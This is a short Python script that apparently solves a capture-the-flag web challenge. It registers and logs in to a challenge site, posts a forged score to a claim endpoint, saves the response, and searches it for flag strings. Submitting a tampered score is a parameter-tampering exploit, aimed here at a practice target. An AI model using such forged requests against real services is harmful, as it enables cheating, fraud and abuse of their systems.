import requests, sys
sys.stdout.reconfigure(encoding='utf-8', errors='replace')
sys.stderr.reconfigure(encoding='utf-8', errors='replace')

base = 'https://web-random-cheese.tracebash.xyz'
s = requests.Session()
s.post(f'{base}/register', data={'username':'winflag','password':'winflag'})
s.post(f'{base}/login', data={'username':'winflag','password':'winflag'})
r = s.post(f'{base}/claim', data={'score':'85'})
# Save raw response
with open('C:/Users/MSI/OneDrive/Bureau/RedBox/redbox-ops-core/backend/tmp/7b788dad-145c-4441-9aa3-b05e507795bc/response.html','w',encoding='utf-8',errors='replace') as f:
    f.write(r.text)
# Search for flag
import re
flags = re.findall(r'[A-Z]{3,}\{[^}]+\}', r.text)
for fg in flags:
    if fg not in ['{currentRotation}deg','{finalAngle}deg']:
        print('FLAG:', fg)
# Also check lines
for line in r.text.split('\n'):
    if any(x in line.lower() for x in ['flag','ctf','congratulations','won','win']):
        print(line.encode('ascii',errors='backslashreplace'))